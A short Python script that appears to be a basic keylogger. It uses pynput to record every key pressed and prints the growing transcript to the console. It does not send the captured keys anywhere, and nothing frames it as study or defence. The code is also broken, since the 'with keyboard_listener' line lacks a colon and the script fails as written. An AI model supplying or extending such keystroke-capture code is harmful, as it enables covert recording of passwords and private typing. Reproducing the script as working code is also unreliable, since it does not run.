#!/usr/bin/python
import pynput.keyboard

keys = ""
def process_keys(key):
	global keys
	try:
		keys = keys + str(key.char)
	except AttributeError:
		if key == key.space:
			keys = keys + " "
		else:
			keys = keys + " " + str(key) + " "
	print(keys)

keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
with keyboard_listener
	keyboard_listener.join()
